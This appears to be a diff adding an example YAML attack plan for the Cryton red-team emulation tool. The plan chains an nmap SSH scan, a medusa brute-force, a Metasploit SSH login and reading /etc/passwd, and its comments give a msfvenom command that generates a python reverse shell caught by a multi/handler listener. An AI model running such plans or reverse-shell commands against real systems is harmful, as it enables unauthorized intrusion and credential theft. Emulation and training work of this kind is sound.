@@ -1,0 +1,111 @@
+---
+# This is an advanced example of Step chaining. In this example we combine output sharing,
+# MSFListener/HTTPListener triggers, execution variables, and sessions.
+# Required modules: nmap, medusa, metasploit, command.
+# To trigger the HTTPListener, use command "curl http://<worker_ip>:8082/index?test=test".
+# To trigger the MSFListener, generate the script using `msfvenom` tool
+# (msfvenom -p python/shell_reverse_tcp lhost=<Metasploit host's IP address> lport=4444 > r_shell.py) and execute the script.
+
+plan:
+  name: Advanced example
+  owner: Cryton
+  stages:
+    - name: stage-get-etc-passwd
+      trigger_type: delta
+      trigger_args:
+        seconds: 0
+      steps:
+        - name: check-ssh
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            module: nmap
+            module_arguments:
+              target: {{ target.address }}
+              ports:
+                - 22
+          next:
+            - type: result
+              value: ok
+              step: bruteforce
+        - name: bruteforce
+          step_type: worker/execute
+          arguments:
+            module: medusa
+            module_arguments:
+              target: {{ target.address }}
+              credentials:
+                username: "{{ bruteforce.username }}"
+                password: "{{ bruteforce.password }}"
+          next:
+            - type: result
+              value: ok
+              step: get-ssh-session
+        - name: get-ssh-session
+          step_type: worker/execute
+          arguments:
+            create_named_session: session_to_target_1
+            module: metasploit
+            module_arguments:
+              module_type: auxiliary
+              module: scanner/ssh/ssh_login
+              module_options:
+                RHOSTS: {{ target.address }}
+                USERNAME: $parent.username
+                PASSWORD: $parent.password
+          next:
+            - type: result
+              value: ok
+              step: session-cmd
+        - name: session-cmd
+          step_type: worker/execute
+          arguments:
+            use_named_session: session_to_target_1
+            module: command
+            module_arguments:
+              command: cat /etc/passwd
+
+    - name: stage-http
+      depends_on:
+        - stage-get-etc-passwd
+      trigger_type: HTTPListener
+      trigger_args:
+        host: 0.0.0.0
+        port: 8082
+        routes:
+          - path: /index
+            method: GET
+            parameters:
+              - name: test
+                value: test
+      steps:
+        - name: execute-command
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            module: command
+            module_arguments:
+              command: echo "it works!"
+
+    - name: stage-msf
+      depends_on:
+        - stage-http
+      trigger_type: MSFListener
+      trigger_args:
+        identifiers:
+          via_exploit: exploit/multi/handler
+          via_payload: payload/python/shell_reverse_tcp
+        exploit: multi/handler
+        payload: python/shell_reverse_tcp
+        payload_arguments:
+          LHOST: {{ metasploit_host_address }}
+          LPORT: 4444
+      steps:
+        - name: execute-in-session
+          is_init: true
+          step_type: worker/execute
+          arguments:
+            use_named_session: stage-msf_session
+            module: command
+            module_arguments:
+              command: whoami
